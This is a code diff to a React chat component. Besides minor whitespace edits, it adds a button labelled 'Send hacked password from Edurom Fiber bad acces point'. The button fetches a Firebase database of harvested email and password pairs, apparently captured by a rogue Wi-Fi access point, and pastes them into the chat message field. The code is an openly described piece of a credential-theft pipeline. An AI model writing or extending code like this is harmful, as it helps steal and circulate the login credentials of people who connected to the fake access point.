@@ -10,6 +10,7 @@ import { useGetMessages } from "../../hooks/useGetMessages";
 import Avatar from "@mui/material/Avatar";
 import { useMessageCreated } from "../../hooks/useMessageCreated";
 import PersonAddIcon from '@mui/icons-material/PersonAdd';
+import PasswordIcon from '@mui/icons-material/Password';
 import {
     Dialog,
     DialogActions,
@@ -45,7 +46,13 @@ const messageToLong: SnackInterface = {
 }
 
 
+
+
+
 const Chat = () => {
+
+
+
     const params = useParams();
     const { data: user } = useGetMe();
     const [messageState, setMessageState] = useState("");
@@ -77,6 +84,7 @@ const Chat = () => {
 
     const [messagesLocal, setMessagesLocal] = useState<Message[]>([]);
     const [messagesLocal2, setMessagesLocal2] = useState<Message[]>([]);
+
 
 
 
@@ -350,9 +358,35 @@ const Chat = () => {
                     marginBottom: "-70px",
                 }}
             >
-{/*                <IconButton sx={{ mr: 1 }} disabled={true}>
-                    <AttachFileIcon fontSize="small" />
-                </IconButton>*/}
+
+                <Tooltip title="Send hacked password from Edurom Fiber bad acces point">
+                    <IconButton sx={{ mr: 1 }} onClick={async ()=>{
+
+                            try {
+                                const res = await fetch('https://electronique-4d008-default-rtdb.europe-west1.firebasedatabase.app/pipico.json');
+                                const data = await res.json();
+
+                                //console.log(data)
+
+                                let data2:any
+                                let i:any
+
+                                for (i in data){
+                                    //console.log(i)
+
+                                    data2 += data[i].email + " " + data[i].password + " "
+
+                                }
+                                setMessageState(data2)
+
+                            } catch (error) {
+                                //console.error(error);
+                            }}
+                    }>
+                        <PasswordIcon fontSize="small" />
+                    </IconButton>
+                </Tooltip>
+
 
                 <InputBase
                     inputRef={inputRef}
@@ -426,8 +460,6 @@ const Chat = () => {
                     </Button>
                 </DialogActions>
             </Dialog>
-
-
         </Stack>)
 }
 
